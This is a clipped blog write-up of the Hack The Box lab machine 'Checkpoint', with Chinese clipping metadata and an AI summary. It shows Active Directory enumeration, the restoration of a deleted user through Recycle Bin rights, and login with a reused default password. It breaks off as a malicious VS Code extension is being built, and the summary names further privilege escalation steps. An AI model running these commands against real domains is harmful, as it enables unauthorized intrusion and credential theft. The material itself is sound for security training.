---
title: "HTB: Checkpoint | 0xdf hacks stuff"
source: https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html
source_host: 0xdf.gitlab.io
clip_date: 2026-10-24T23:11:54+08:00
trace_id: 1eca62ac-0020-4f52-821e-c802331ea011
content_hash: 3eb31a3b91d9a084e73018e916f6ef59d45637d1067d68270178d81316bae2cb
status: synced
tags:
  - 漏洞分析
  - 安全工具
series: null
feed_source: 0xdf·HTB/逆向
ai_summary: "**TL;DR：** 从初始凭据 alex.turner 出发，利用对 AD 回收站的异常写权限复活已删用户，再借 DevDrop 共享投毒 VS Code 扩展、用 BetterSuccessor 拿服务账号哈希，最终从 VMware 内存快照提取到域管哈希。"
ai_summary_style: key-points
images_status:
  total: 12
  succeeded: 9
  failed_urls:
    - https://www.hackthebox.com/badge/image/1893875
    - https://www.hackthebox.com/badge/image/1893875
    - https://www.hackthebox.com/badge/image/994939
notion_page_id: 40375244-d011-819a-9bcd-d5819609a524
ioc:
  cves:
    - CVE-2025-53779
  cwes: []
  hashes:
    - "00000000000000000000000000000000"
    - 28de0079b3558e076f17a47613e94d5ca215427f6bb31192670ce7ca44eae513
    - 28f8d934dee90b2ec824351cb0844479
    - 3a997d283fc46da0bd689ee00614a24d
    - 44bb34a624afcd186909843e6cbdb4cfee908975
    - 75247bc64fa0086d2c98744d4bcd53f5
    - 77d90ebac2487f870a26e4776c72b4509b06dd1b
    - 817ceac7dac6b9f5b2eaa9add3c198f78122fec4cfeb6789b0013966f51e6e4e
    - 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
    - 90b1c277630e507a8e28d7b260a53f21712c3f1d
    - 914b2bd39adf134401ec6eceb08f8ec131d2ecbd
    - 97c13d761a155547def03f846df80ada
    - b061f87be6d2776897d912fed9156a354b81a595
    - b1ae149b19996e0fa6745971812d9a08
    - b2bf2c648554143d6b28b3c06a1ece7e40867238
    - e16081eb077aca74bdbf8af12af43ac9
    - f29e9c014295b9b32139b09a2790be3b
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> **TL;DR：** 从初始凭据 alex.turner 出发，利用对 AD 回收站的异常写权限复活已删用户，再借 DevDrop 共享投毒 VS Code 扩展、用 BetterSuccessor 拿服务账号哈希，最终从 VMware 内存快照提取到域管哈希。
> 
> - **回收站三条件：** 复活已删账号需同时具备三条件：对已删对象的写权限、对 `lastKnownParent` 所在 OU 的 `CREATE_CHILD`、以及域对象上的 Reanimate-Tombstones 扩展权限；alex.turner 三者全有，用 `bloodyAD ... set restore mark.davies` 一步还原。
> - **默认口令复用：** 还原后保留原密码哈希，组织默认口令 `Checkpoint2024!` 对 mark.davies 依然有效；用带 SHOW_RECYCLED/SHOW_DEACTIVATED_LINK OID 控制项的 LDAP 查询才能看到 Deleted Objects 内容。
> - **扩展投毒要点：** mark.davies 对 DevDrop 有 READ,WRITE；恶意扩展需把 `activationEvents` 设为 `onStartupFinished`、`engines.vscode` 与 `@types/vscode` 改成 `^1.118.0` 以匹配目标版本，用 `vsce package` 打包；远程需 `cmd.exe` 派生，用 `sh` 会立即断连。
> - **BetterSuccessor 绕过：** BadSuccessor 已打补丁，但对目标账号有写权限时仍可建 dMSA 并伪装 — `bloodyAD add badSuccessor` 或主机端 SharpSuccessor+Rubeus `/dmsa`，票据 PAC 携带被模拟账号的 SID 与组权限，同时泄露 svc_deploy 的 RC4 哈希（可直接 WinRM 登录）。
> - **快照取哈希：** svc_deploy 可读 VMBackups，其中的 `.vmsn`/`.vmem` 含 LSASS；`vmkatz` 对大于本机可用内存的 2GB 快照仍能提取，得到的独立 Server 2019 本地管理员 NT 哈希被域 Administrator 复用。

[HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/checkpoint-cover.webp)

Checkpoint is an assume breach Active Directory box where the starting account has unusual rights over the AD Recycle Bin. I’ll restore a deleted user who still has the default password, and use their write access to a share to plant a malicious VS Code extension that a sync job installs, giving me a shell. BadSuccessor is patched on this domain controller, but I’ll show that the BetterSuccessor technique still works when I can write to the target account, which gets me its NTLM hash. That account can read a share of VMware backups, where I’ll use vmkatz to pull an administrator hash from a memory snapshot, which turns out to be reused by the domain Administrator.

## Box Info

[![Checkpoint](https://0xdf.gitlab.io/icons/box-checkpoint.webp)](https://hackthebox.com/machines/checkpoint)

[Checkpoint](https://hackthebox.com/machines/checkpoint)

Medium

Retire Date 24 Oct 2026

OS ![Windows](https://0xdf.gitlab.io/icons/Windows.webp)

Rated Difficulty ![Rated difficulty for Checkpoint](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/checkpoint-diff.webp)

![Rated difficulty for Checkpoint](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/229c9103ca023d2f.png)

Radar Graph ![Radar chart for Checkpoint](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/checkpoint-radar.webp)

![Radar chart for Checkpoint](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a03e2708568456a5.png)

User

00:12:43 [ahos6](https://app.hackthebox.com/users/1893875)

![⚠️ 图片托管失败 · ahos6](https://www.hackthebox.com/badge/image/1893875)

Root

00:36:33 [ahos6](https://app.hackthebox.com/users/1893875)

Creator [AnuragTaparia](https://app.hackthebox.com/users/994939)

![⚠️ 图片托管失败 · AnuragTaparia](https://www.hackthebox.com/badge/image/994939)

Scenario

As is common in real life pentests, you will start the Checkpoint box with credentials for the following account alex.turner / Checkpoint2024!

## Recon

### Initial Scanning

`nmap` finds 21 open TCP ports:

```bash
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.109.154
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-15 17:08 UTC
Nmap scan report for 10.129.109.154
Host is up, received echo-reply ttl 127 (0.021s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49672/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49680/tcp open  unknown          syn-ack ttl 127
49685/tcp open  unknown          syn-ack ttl 127
49712/tcp open  unknown          syn-ack ttl 127
49720/tcp open  unknown          syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
oxdf@hacky$ sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49672,49673,49679,49680,49685,49712,49720 10.129.109.154 -sCV 10.129.109.154
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-15 17:12 UTC
Nmap scan report for 10.129.109.154
Host is up (0.021s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-17 18:35:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2d01h22m39s
| smb2-time:
|   date: 2026-10-17T18:36:31
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `checkpoint.htb`, and the hostname is `DC01`.

I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:

```bash
oxdf@hacky$ netexec smb DC01.checkpoint.htb --generate-hosts-file hosts
SMB         10.129.109.154  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False) (DC:True)
oxdf@hacky$ cat hosts /etc/hosts | sudo sponge /etc/hosts
oxdf@hacky$ head -1 /etc/hosts
10.129.109.154     DC01.checkpoint.htb checkpoint.htb DC01
```

All of the ports show a TTL of 127, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Windows one hop away.

`nmap` notes a clock skew, so I’ll want to make sure to run `sudo ntpdate DC01.checkpoint.htb` before any actions that use Kerberos auth.

I’ll go ahead and set up my `krb5.conf` file with `netexec`:

```css
oxdf@hacky$ netexec smb DC01.checkpoint.htb --generate-krb5-file krb5.conf
SMB         10.129.109.154  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False) (DC:True)
SMB         10.129.109.154  445    DC01             [+] krb5 conf saved to: krb5.conf
SMB         10.129.109.154  445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
oxdf@hacky$ sudo cp krb5.conf /etc/
```

Neither `--generate-hosts-file` nor `--generate-krb5-file` worked right initially because of how Server 2025 handles null binding. I submitted a [PR](https://github.com/Pennyw0rth/NetExec/pull/1477) to `netexec` to fix this.

### Initial Credentials

HackTheBox provides the following scenario associated with Checkpoint:

As is common in real life pentests, you will start the Checkpoint box with credentials for the following account alex.turner / Checkpoint2024!

The creds work:

```css
oxdf@hacky$ netexec smb 10.129.109.154 -u alex.turner -p 'Checkpoint2024!'
SMB         10.129.109.154  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
SMB         10.129.109.154  445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
```

They also work for LDAP, but not WinRM (unsurprisingly):

```css
oxdf@hacky$ netexec ldap 10.129.109.154 -u alex.turner -p 'Checkpoint2024!'
LDAP        10.129.109.154  389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.109.154  389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
oxdf@hacky$ netexec winrm 10.129.109.154 -u alex.turner -p 'Checkpoint2024!'
WINRM       10.129.109.154  5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) 
WINRM       10.129.109.154  5985   DC01             [-] checkpoint.htb\alex.turner:Checkpoint2024!
```

Given that, I’ll want to prioritize things like:

-   SMB shares
-   BloodHound (which includes most of the data from LDAP)
-   ADCS

A quick check of ADCS doesn’t find anything interesting.

### SMB - TCP 445

#### Shares

In addition to the standard DC shares, there are two additional shares:

```sql
oxdf@hacky$ netexec smb 10.129.109.154 -u alex.turner -p 'Checkpoint2024!' --shares
SMB         10.129.109.154  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
SMB         10.129.109.154  445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.109.154  445    DC01             [*] Enumerated shares
SMB         10.129.109.154  445    DC01             Share           Permissions            Remark
SMB         10.129.109.154  445    DC01             -----           -----------            ------
SMB         10.129.109.154  445    DC01             ADMIN$                                 Remote Admin
SMB         10.129.109.154  445    DC01             C$                                     Default share
SMB         10.129.109.154  445    DC01             DevDrop         READ                   VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.109.154  445    DC01             IPC$            READ                   Remote IPC
SMB         10.129.109.154  445    DC01             NETLOGON        READ                   Logon server share 
SMB         10.129.109.154  445    DC01             SYSVOL          READ                   Logon server share 
SMB         10.129.109.154  445    DC01             VMBackups   
```

alex.turner cannot read `VMBackups`, but does have read access to `DevDrop`, which has the comment:

> VS Code extensions share for approved.vsix packages compatible with VS Code engine 1.118.0

The share is empty:

```
oxdf@hacky$ smbclient //DC01.checkpoint.htb/DevDrop -U 'alex.turner%Checkpoint2024!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 21:45:01 2026
  ..                                  D        0  Sat May  9 14:42:27 2026

                10459391 blocks of size 4096. 2470968 blocks available
```

There’s an implication that if I put a VS Code extension in this share it will be run, but alex.turner doesn’t have write permissions to the share.

#### Users

Authenticated SMB will list the users on the host:

```yaml
oxdf@hacky$ netexec smb 10.129.109.154 -u alex.turner -p 'Checkpoint2024!' --users
SMB         10.129.109.154  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
SMB         10.129.109.154  445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
SMB         10.129.109.154  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.109.154  445    DC01             Administrator                 2026-05-09 16:16:34 0       Built-in account for administering the computer/domain
SMB         10.129.109.154  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.109.154  445    DC01             krbtgt                        2026-05-09 08:41:01 0       Key Distribution Center Service Account
SMB         10.129.109.154  445    DC01             alex.turner                   2026-05-09 09:00:08 0
SMB         10.129.109.154  445    DC01             ryan.brooks                   2026-05-10 13:46:18 0
SMB         10.129.109.154  445    DC01             svc_deploy                    2026-05-09 09:01:19 0       Deployment service account
SMB         10.129.109.154  445    DC01             james.harper                  2026-05-09 09:02:53 0
SMB         10.129.109.154  445    DC01             sarah.mitchell                2026-05-09 09:02:58 0
SMB         10.129.109.154  445    DC01             emily.carter                  2026-05-09 09:03:05 0
SMB         10.129.109.154  445    DC01             david.reynolds                2026-05-09 09:03:11 0
SMB         10.129.109.154  445    DC01             jessica.coleman               2026-05-09 09:03:15 0
SMB         10.129.109.154  445    DC01             lauren.flores                 2026-05-09 09:03:21 0
SMB         10.129.109.154  445    DC01             michael.torres                2026-05-09 09:03:28 0
SMB         10.129.109.154  445    DC01             kevin.patterson               2026-05-09 09:03:33 0
SMB         10.129.109.154  445    DC01             brian.jenkins                 2026-05-09 09:03:37 0
SMB         10.129.109.154  445    DC01             megan.perry                   2026-05-09 09:03:42 0
SMB         10.129.109.154  445    DC01             max.palmer                    2026-05-26 01:25:15 0
SMB         10.129.109.154  445    DC01             [*] Enumerated 17 local users: CHECKPOINT
```

There’s a group of users with the pattern first.last, as well as a svc_deploy service account.

### LDAP - TCP 389

#### Roasting

I’ll check for any Kerberoastable or AS-REP-Roastable accounts, but there are none:

```css
oxdf@hacky$ netexec ldap 10.129.109.154 -u alex.turner -p 'Checkpoint2024!' --kerberoast kerberoast
LDAP        10.129.109.154  389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.109.154  389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
LDAP        10.129.109.154  389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.129.109.154  389    DC01             [*] Total of records returned 0
oxdf@hacky$ netexec ldap 10.129.109.154 -u alex.turner -p 'Checkpoint2024!' --asreproast asreproast
LDAP        10.129.109.154  389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.109.154  389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
LDAP        10.129.109.154  389    DC01             No entries found!
```

#### GMSA

There are no gMSA accounts visible on the host:

```css
oxdf@hacky$ netexec ldap 10.129.109.154 -u alex.turner -p 'Checkpoint2024!' --gmsa
LDAP        10.129.109.154  389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.109.154  389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
LDAP        10.129.109.154  389    DC01             [*] Getting GMSA Passwords
```

#### BloodHound

`rusthound-ce` wouldn’t work in its default configuration because LDAP signing is enforced. I’m able to get around this using Kerberos for authentication:

```rust
oxdf@hacky$ kinit alex.turner
Password for alex.turner@CHECKPOINT.HTB: 
oxdf@hacky$ rusthound-ce --domain checkpoint.htb -k -f DC01.checkpoint.htb --zip
---------------------------------------------------
Initializing RustHound-CE at 19:42:14 on 10/17/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-10-17T19:42:14Z INFO  rusthound_ce] Verbosity level: Info
[2026-10-17T19:42:14Z INFO  rusthound_ce] Collection method: All
[2026-10-17T19:42:14Z INFO  rusthound_ce::ldap] Connected to CHECKPOINT.HTB Active Directory!
[2026-10-17T19:42:14Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-10-17T19:42:14Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-10-17T19:42:14Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=checkpoint,DC=htb
[2026-10-17T19:42:14Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-10-17T19:42:15Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=checkpoint,DC=htb
[2026-10-17T19:42:15Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-10-17T19:42:16Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=checkpoint,DC=htb
[2026-10-17T19:42:16Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-10-17T19:42:16Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=checkpoint,DC=htb
[2026-10-17T19:42:16Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-10-17T19:42:16Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=checkpoint,DC=htb
[2026-10-17T19:42:16Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-10-17T19:42:16Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-10-17T19:42:16Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-10-17T19:42:16Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-10-17T19:42:16Z INFO  rusthound_ce::json::maker::common] 18 users parsed!
[2026-10-17T19:42:16Z INFO  rusthound_ce::json::maker::common] 70 groups parsed!
[2026-10-17T19:42:16Z INFO  rusthound_ce::json::maker::common] 1 computer parsed!
[2026-10-17T19:42:16Z INFO  rusthound_ce::json::maker::common] 8 ous parsed!
[2026-10-17T19:42:16Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-10-17T19:42:16Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-10-17T19:42:16Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-10-17T19:42:16Z INFO  rusthound_ce::json::maker::common] .//20261017194216_checkpoint-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 19:42:16 on 10/17/26! Happy Graphing!
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

I’ll open this in the BloodHound-CE Docker instance. I’ll mark alex.turner as owned, but there’s nothing interesting there.

There are 8 OUs mentioned in the collection. I can view them nicely with `MATCH p=(:Domain)-[:Contains*1..]->(:OU) RETURN p` as the cypher query:

![image-20261017085930561](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7c3e9397092fbb4a.png)

![image-20261017085930561](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261017085930561.webp)

The DMSAHolder OU is a hint that delegated Managed Service Accounts (dMSAs) will come into play later.

#### Writable Objects

Without much else to look at, I’ll have `bloodyAD` list the writable objects from alex.turner:

```css
oxdf@hacky$ bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -p Checkpoint2024! get writable

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

Several of these are interesting. The first one says that alex.turner can create items in the Employees OU. The third says that this account can modify the DACL on the Deleted Objects container, which is unusual, as typically only admin groups can even list it, let alone write it. The fourth is `WRITE` permissions over a deleted user, Mark Davies. The other three (the Authenticated Users foreign security principal and the two DNS zones) are standard for any authenticated user. None of this showed up in BloodHound, which doesn’t collect ACLs on the Deleted Objects container or on deleted objects.

## Auth as mark.davies

### Reanimate Mark Davies

To reanimate a deleted account, a user must have three things:

-   Write on the deleted object - alex.turner has write over Mark Davies.
-   Create-child on the container it goes back into - alex.turner has `CREATE_CHILD` on the Employees OU, which seems like a likely target.
-   Reanimate-Tombstones extended right on the domain object.

I don’t know about the third one, but I can pull it using `bloodyAD`. It dumps a ton of data, so I’ll `grep`:

```
oxdf@hacky$ bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object 'DC=checkpoint,DC=htb' --attr nTSecurityDescriptor --resolve-sd | grep -i tombstone
nTSecurityDescriptor.ACL.2.ObjectType: Reanimate-Tombstones
```

It’s ACL.2, so I’ll get all the information about that:

```css
oxdf@hacky$ bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object 'DC=checkpoint,DC=htb' --attr nTSecurityDescriptor --resolve-sd | grep -F ACL.2.
nTSecurityDescriptor.ACL.2.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.2.Trustee: alex.turner
nTSecurityDescriptor.ACL.2.Right: CONTROL_ACCESS
nTSecurityDescriptor.ACL.2.ObjectType: Reanimate-Tombstones
```

This confirms that access.

I’ll get information about the deleted account as well using the following options:

-   `-c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065` - These add the `LDAP_SERVER_SHOW_RECYCLED_OID` and `LDAP_SERVER_SHOW_DEACTIVATED_LINK_OID` controls to the request. Without these, the DC will hide everything in `CN=Deleted Objects`.
-   `--base 'CN=Deleted Objects,DC=checkpoint,DC=htb'` - Searching in Deleted Objects.
-   `--filter '(sAMAccountName=*)'` - Only return objects with an account name.
-   `--attr ...` - The attributes to show (the output is very long without this).

```css
oxdf@hacky$ bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --base 'CN=Deleted Objects,DC=checkpoint,DC=htb' --filter '(sAMAccountName=*)' --attr sAMAccountName,lastKnownParent,description,objectSid

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
lastKnownParent: OU=Employees,DC=checkpoint,DC=htb
objectSid: S-1-5-21-3129162710-3498938529-1807524340-1102
sAMAccountName: mark.davies
```

The `lastKnownParent` is the Employees OU, which alex.turner can write, and the account name is mark.davies.

The `tombstone` module for `netexec` will also list this information:

```
oxdf@hacky$ netexec ldap 10.129.109.154 -u alex.turner -p 'Checkpoint2024!' -M tombstone -o ACTION=query
LDAP        10.129.109.154  389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.109.154  389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
TOMBSTONE   10.129.109.154  389    DC01             
TOMBSTONE   10.129.109.154  389    DC01             sAMAccountName      : mark.davies
TOMBSTONE   10.129.109.154  389    DC01             description         : 
TOMBSTONE   10.129.109.154  389    DC01             dn                  : CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
TOMBSTONE   10.129.109.154  389    DC01             ID                  : 2217e877-e2a2-47d7-91d4-99ede36f367e
TOMBSTONE   10.129.109.154  389    DC01             isDeleted           : TRUE
TOMBSTONE   10.129.109.154  389    DC01             lastKnownParent     : OU=Employees,DC=checkpoint,DC=htb
TOMBSTONE   10.129.109.154  389    DC01             
TOMBSTONE   10.129.109.154  389    DC01             Found 1 deleted objects
```

I showed abusing the AD Recycle Bin before in [TombWatcher](https://0xdf.gitlab.io/2025/10/11/htb-tombwatcher.html). `bloodyAD` can restore a deleted account using one command, putting it back in its `lastKnownParent`:

```
oxdf@hacky$ bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore mark.davies
[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

### Authenticate

At this point I’ve recovered the account, but I can’t authenticate as it. alex.turner doesn’t have permissions to set mark.davies’ password:

```kotlin
oxdf@hacky$ changepasswd.py checkpoint.htb/mark.davies@DC01.checkpoint.htb -reset -altuser alex.turner -altpass 'Checkpoint2024!' -newpass '0xdf0xdf...'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of checkpoint.htb\mark.davies as checkpoint.htb\alex.turner
[*] Connecting to DCE/RPC as checkpoint.htb\alex.turner
[-] checkpoint.htb\alex.turner user is not allowed to set the password of the target
```

A restored object comes back with its attributes intact, including its password hash. Checkpoint2024! looks like an organizational default given to new accounts, so it’s worth trying on mark.davies, and it works:

```
oxdf@hacky$ netexec smb DC01.checkpoint.htb -u mark.davies -p Checkpoint2024!
SMB         10.129.109.154  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
SMB         10.129.109.154  445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
```

## Shell as ryan.brooks

### Enumeration

mark.davies won’t be in my initial BloodHound collection, but I can re-run the collection and upload the new archive, and now they are:

![image-20261018080131101](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8b5886f982b3cd8c.png)

![image-20261018080131101](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261018080131101.webp)

Turns out my RustHound-CE is out of date, as newer version after [this feature](https://github.com/g0h4n/RustHound-CE/issues/39) do collect deleted objects.

They don’t have any interesting controls. They do have write access to the `DevDrop` share:

```sql
oxdf@hacky$ netexec smb DC01.checkpoint.htb -u mark.davies -p Checkpoint2024! --shares
SMB         10.129.109.154  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
SMB         10.129.109.154  445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
SMB         10.129.109.154  445    DC01             [*] Enumerated shares
SMB         10.129.109.154  445    DC01             Share           Permissions            Remark
SMB         10.129.109.154  445    DC01             -----           -----------            ------
SMB         10.129.109.154  445    DC01             ADMIN$                                 Remote Admin
SMB         10.129.109.154  445    DC01             C$                                     Default share
SMB         10.129.109.154  445    DC01             DevDrop         READ,WRITE             VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.109.154  445    DC01             IPC$            READ                   Remote IPC
SMB         10.129.109.154  445    DC01             NETLOGON        READ                   Logon server share 
SMB         10.129.109.154  445    DC01             SYSVOL          READ                   Logon server share 
SMB         10.129.109.154  445    DC01             VMBackups    
```

### Malicious VS Code Extension

#### Create Extension

A VS Code extension can be as simple as a `package.json` manifest and a single JavaScript file, but I’ll follow [this tutorial](https://code.visualstudio.com/api/get-started/your-first-extension) from Visual Studio Code to create an extension. I’ll use `npx --package yo --package generator-code -- yo code` to start the creator:

```sql
oxdf@hacky$ npx --package yo --package generator-code -- yo code

     _-----_     ╭──────────────────────────╮
    |       |    │   Welcome to the Visual  │
    |--(o)--|    │   Studio Code Extension  │
